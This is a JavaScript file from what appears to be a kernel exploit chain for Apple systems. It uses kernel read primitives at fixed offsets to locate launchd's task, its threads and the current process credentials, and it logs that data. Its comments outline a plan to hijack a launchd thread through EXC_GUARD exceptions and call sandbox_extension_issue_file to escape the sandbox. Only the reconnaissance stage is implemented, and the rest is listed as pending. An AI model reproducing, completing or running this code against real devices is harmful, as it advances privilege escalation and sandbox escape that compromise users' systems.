// escalate.js — Privilege escalation via launchd sandbox token delegation
//
// This implements the DarkSword approach:
// 1. Find launchd task + thread
// 2. Create exception ports
// 3. Inject EXC_GUARD on launchd thread
// 4. Catch exception, hijack thread state to call sandbox_extension_issue_file
// 5. Consume the resulting token
//
// NOTE: Steps 2-5 require Mach IPC (mach_port_allocate, thread_set_exception_ports,
// mach_msg) which are USERSPACE calls. The REPL's JS context doesn't have access
// to these — they need to be implemented as native Swift functions exposed to JS.
//
// This script currently implements step 1 (finding targets) and validates
// the kernel structures needed for the full chain.

log('=== Privilege Escalation Preparation ===');
log('');

// Step 1: Find our task and launchd
var kt = kread64(slide('0xc1bf78'));
var task = kread64(add(kt, '0x30'));
var ourPid = pid();
var launchdTask = '0x0';
var launchdProc = '0x0';
var ourTask = '0x0';
var ourProc = '0x0';

for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0' || proc.indexOf('0xffffff') != 0) { task = kread64(add(task, '0x30')); continue; }
  var p = kread32(add(proc, '0x60'));
  var pDec = parseInt(p, 16);
  if (pDec == 1) { launchdTask = task; launchdProc = proc; }
  if (pDec == ourPid) { ourTask = task; ourProc = proc; }
  if (launchdTask != '0x0' && ourTask != '0x0') break;
  task = kread64(add(task, '0x30'));
}

log('launchd task: ' + launchdTask);
log('launchd proc: ' + launchdProc);
log('our task:     ' + ourTask);
log('our proc:     ' + ourProc);
log('our pid:      ' + ourPid);
log('');

// Step 2: Read launchd's threads
var launchdFirstThread = kread64(add(launchdTask, '0x58'));
log('launchd first thread: ' + launchdFirstThread);

// Walk launchd's thread list to count threads
var threadCount = 0;
var currThread = launchdFirstThread;
var threads = [];
for (var t = 0; t < 50; t++) {
  if (currThread == '0x0') break;
  threads.push(currThread);
  threadCount++;
  // thread->task_threads.next is at offset 0x3e8 (taskThreads for XNU 24.6)
  var nextThread = kread64(add(currThread, '0x3e8'));
  if (nextThread == launchdFirstThread || nextThread == '0x0') break;
  currThread = nextThread;
}
log('launchd thread count: ' + threadCount);
log('');

// Step 3: Read our credential chain
var credRef = kread64(add(ourProc, '0x18'));
var ucred = kread64(add(credRef, '0x28'));
var uid = kread32(add(ucred, '0x18'));
log('=== Current Credentials ===');
log('credRef: ' + credRef);
log('ucred:   ' + ucred);
log('cr_uid:  ' + uid + ' (decimal: ' + parseInt(uid, 16) + ')');
log('');

// Step 4: Read launchd's excGuard info for each thread
log('=== Launchd Thread State ===');
for (var t = 0; t < Math.min(threads.length, 3); t++) {
  var th = threads[t];
  var kstack = kread64(add(th, '0x148'));
  var excGuard = kread64(add(th, '0x624'));
  var ast = kread32(add(th, '0x414'));
  log('thread[' + t + ']: ' + th + ' kstack=' + kstack + ' excGuard=' + excGuard + ' ast=' + ast);
}
log('');

// Step 5: Summary
log('=== Escalation Requirements ===');
log('To complete privilege escalation, need native Swift functions for:');
log('  1. mach_port_allocate() — create exception ports');
log('  2. thread_set_exception_ports() — register on launchd thread');
log('  3. mach_msg() — receive/reply to exception messages');
log('  4. PAC signing — sign new PC/LR for thread state');
log('');
log('These must be exposed as REPL JS functions from Swift.');
log('Then we can: inject EXC_GUARD → catch exception → hijack to call');
log('sandbox_extension_issue_file() in launchd context → consume token');

'escalation_prep_complete';
